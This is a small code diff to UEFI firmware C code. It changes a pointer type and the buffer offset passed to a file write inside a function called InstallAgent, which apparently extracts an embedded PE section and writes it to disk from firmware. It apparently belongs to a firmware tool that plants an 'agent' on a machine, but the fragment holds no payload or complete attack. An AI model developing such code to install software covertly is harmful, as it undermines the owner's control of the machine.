@@ -87,7 +87,7 @@ OUT UINTN*  VirtualSize
    EFI_IMAGE_NT_HEADERS32 *ImageNtHeaders;
 #endif
 
-   char *sectiondata;
+   UINT8 *sectiondata;
    char SectionName[9] = { 0 };
    ImageDosHeader = ImageBase;
 
@@ -415,7 +415,7 @@ InstallAgent(
 		return Status;
 	}
 
-	Status=FileHandle->Write(FileHandle,&VirtualSize,(UINTN*)pSectiondata);
+	Status=FileHandle->Write(FileHandle,&VirtualSize,(UINTN*)pSectiondata+(UINT8)4);
 	if( Status != EFI_SUCCESS ) 
 	{
 #ifdef FORCE_DEBUG
